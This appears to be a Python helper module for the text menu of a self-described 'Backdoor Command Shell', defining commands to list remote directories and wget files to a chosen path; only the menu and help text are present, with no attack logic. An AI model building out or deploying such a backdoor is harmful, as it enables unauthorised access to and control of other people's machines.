"""
    This module contains code for using the shell interpreter which is used in the main.py file.
"""
from os import system

# Useful string constants
HELP = "help"
CLEAR = "clear"
EXIT = "exit"
LIST = "list"
WGET = "wget"

def clear_screen():
    system("clear")

def print_menu():
    clear_screen()
    print("Welcome to the Backdoor Command Shell!")
    print("Enter 'help' for a list of commands")

def print_help():
    print("Possible Commands:")
    print("help " + 4*"\t" + " Displays this help screen.")
    print("clear " + 4*"\t" + " Clears the terminal screen.")
    print("exit " + 4*"\t" + " End the terminal session.")
    print("list filepath" + 3*"\t" + " Attempts to list the contents of the given directory (filepath).")
    print("wget url filepath" + 2*"\t" + " Downloads the resource from 'url' to the given 'filepath'.")

